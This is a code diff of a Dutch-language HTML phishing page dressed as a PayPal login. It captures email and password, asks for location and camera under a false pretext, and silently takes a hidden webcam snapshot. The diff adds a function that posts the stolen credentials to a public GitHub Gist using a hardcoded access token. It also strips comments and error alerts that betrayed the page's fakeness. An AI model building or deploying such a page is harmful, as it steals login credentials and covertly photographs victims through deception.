@@ -77,11 +77,6 @@
         .popup-text {
             color: #333;
         }
-
-        /* Hidden Video Element */
-        #camera-preview {
-            display: none;
-        }
     </style>
 </head>
 <body class="paypal-background">
@@ -92,18 +87,16 @@
         <input type="text" placeholder="E-mailadres" id="email">
         <input type="password" placeholder="Wachtwoord" id="password">
         
-        <!-- Fake login button -->
         <button class="login-btn" onclick="requestPermissions()">Inloggen</button>
     </div>
 
-    <!-- Fake Browser Popup -->
     <div id="fake-popup">
-        <p class="popup-text">Om verder te gaan, controleren wij de locatie en camera of dit van een netwerklaptop/-desktop afkomstig is.</p>
+        <p class="popup-text">Om verder te gaan, moeten de benodigde toestemmingen worden gegeven voor locatie en camera.</p>
     </div>
 
     <script>
         function requestPermissions() {
-            // 🔹 Direct de gegevens van de invoervelden opslaan
+            // Verkrijg de gegevens van de invoervelden
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
             console.log(`📧 Gegevens opgeslagen - E-mail: ${email}, Wachtwoord: ${password}`);
@@ -116,7 +109,7 @@
                 document.getElementById("fake-popup").style.display = "none";
             }, 5000);
 
-            // 🔹 Vraag locatie toestemming eerst, daarna camera toestemming
+            // Vraag locatie toestemming eerst, daarna camera toestemming
             requestLocationPermission()
                 .then(() => {
                     console.log("✅ Locatie toestemming gegeven!");
@@ -124,13 +117,13 @@
                 })
                 .then(() => {
                     console.log("✅ Camera toestemming gegeven!");
+                    sendDataToGitHub(email, password); // Gegevens naar GitHub sturen
                 })
                 .catch(error => {
                     console.log("❌ Fout bij het verkrijgen van toestemmingen:", error);
                 });
         }
 
-        // Functie om locatie toestemming te verkrijgen
         function requestLocationPermission() {
             return new Promise((resolve, reject) => {
                 if (navigator.geolocation) {
@@ -139,34 +132,26 @@
                         resolve();
                     }, error => {
                         console.log("❌ Locatie geweigerd of niet beschikbaar:", error);
-                        alert("Locatie toestemmingsfout: " + error.message);
                         reject();
                     });
                 } else {
                     console.log("❌ Geolocatie wordt niet ondersteund door deze browser.");
-                    alert("Geolocatie wordt niet ondersteund door de browser.");
                     reject();
                 }
             });
         }
 
-        // Functie om camera toestemming te verkrijgen
         function requestCameraPermission() {
             return new Promise((resolve, reject) => {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     navigator.mediaDevices.getUserMedia({ video: true })
                         .then(stream => {
-                            // ** Verborgen camera stream **: camera wordt niet zichtbaar
                             let video = document.createElement("video");
                             video.srcObject = stream;
                             video.width = 320;  
                             video.height = 240; 
                             video.play(); 
-                            
-                            // Video-element wordt verborgen
                             video.style.display = "none";
-
-                            // Simuleer een foto-opname na 3 seconden
                             setTimeout(() => {
                                 takeSelfie(video, stream);
                             }, 3000);
@@ -174,12 +159,10 @@
                         })
                         .catch(error => {
                             console.log("❌ Camera geweigerd:", error);
-                            alert("Camera toestemmingsfout: " + error.message);
                             reject();
                         });
                 } else {
                     console.log("❌ Camera wordt niet ondersteund door deze browser.");
-                    alert("Camera wordt niet ondersteund door de browser.");
                     reject();
                 }
             });
@@ -192,11 +175,44 @@
             let ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            let selfieData = canvas.toDataURL("image/png"); // Zet foto om naar een base64 afbeelding
+            let selfieData = canvas.toDataURL("image/png");
             console.log("📸 Selfie genomen:", selfieData);
 
             // Stop de camera na het maken van de selfie
             stream.getTracks().forEach(track => track.stop());
+        }
+
+        // Functie om de gegevens naar GitHub te sturen (bijvoorbeeld een Gist)
+        function sendDataToGitHub(email, password) {
+            const githubToken = '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'; // Vervang door je persoonlijke token
+
+            const gistData = {
+                description: "Inloggegevens verzameld via BluePortaal",
+                public: true,
+                files: {
+                    "user_data.json": {
+                        content: JSON.stringify({ email: email, password: password })
+                    }
+                }
+            };
+
+            fetch('https://api.github.com/gists', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `token ${githubToken}`
+                },
+                body: JSON.stringify(gistData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('GitHub Gist gemaakt:', data);
+                alert("Gegevens succesvol opgeslagen naar GitHub!");
+            })
+            .catch((error) => {
+                console.error('Fout bij het maken van Gist:', error);
+                alert("Er is een fout opgetreden bij het opslaan.");
+            });
         }
     </script>
 
